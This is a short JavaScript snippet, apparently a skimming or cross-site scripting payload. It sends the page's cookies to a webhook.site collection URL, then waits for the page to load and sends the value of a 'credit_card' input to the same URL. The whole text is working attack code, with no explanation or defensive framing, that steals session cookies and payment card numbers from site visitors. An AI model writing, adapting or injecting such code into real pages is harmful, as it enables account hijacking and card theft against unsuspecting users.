// Send cookies
fetch('https://webhook.site/bc3582e0-6295-481e-a7f2-b8a7703b616f/log?c=' + encodeURIComponent(document.cookie));

// Wait for DOM to load before accessing elements
window.onload = () => {
  const cc = document.getElementById('credit_card');
  if (cc) {
    fetch('https://webhook.site/bc3582e0-6295-481e-a7f2-b8a7703b616f/log?cc=' + encodeURIComponent(cc.value));
  }
};
